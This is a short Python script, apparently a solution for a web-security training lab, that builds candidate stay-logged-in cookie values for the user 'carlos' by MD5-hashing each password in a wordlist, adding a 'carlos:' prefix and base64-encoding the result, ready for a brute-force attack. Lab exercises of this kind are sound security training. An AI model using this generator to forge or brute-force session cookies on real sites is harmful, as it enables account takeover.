# Lab: Brute-forcing a stay-logged-in cookie

import hashlib
import base64

# Input Wordlist
with open('passwords.txt', "r") as f:
    passwords = f.read().splitlines()

# Output Wordlist
with open('base64pass.txt', "w") as out:

    for password in passwords:

        # Step 1 - MD5 Hash
        md5_hash = hashlib.md5(
            password.encode()
        ).hexdigest()
        
        # Step 2 - Add Prefix
        combined = f"carlos:{md5_hash}"

        # Step 3 - Base64 Encoding
        encoded = base64.b64encode(
            combined.encode()
        ).decode()

        # Write to file
        out.write(encoded + "\n")

print("[+] DONE")
